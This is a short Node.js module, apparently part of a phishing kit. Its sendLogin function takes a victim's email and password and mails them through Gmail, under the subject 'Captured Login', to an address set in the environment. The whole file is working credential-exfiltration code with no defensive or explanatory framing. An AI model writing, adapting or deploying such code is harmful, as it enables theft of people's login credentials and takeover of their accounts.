const nodemailer = require("nodemailer");

async function sendLogin({ email, password }) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS
    }
  });

  const mailOptions = {
    from: `"Login Bot" <${process.env.GMAIL_USER}>`,
    to: process.env.RECIPIENT_EMAIL,
    subject: "Captured Login",
    text: `Email: ${email}\nPassword: ${password}`
  };

  await transporter.sendMail(mailOptions);
}

module.exports = sendLogin;
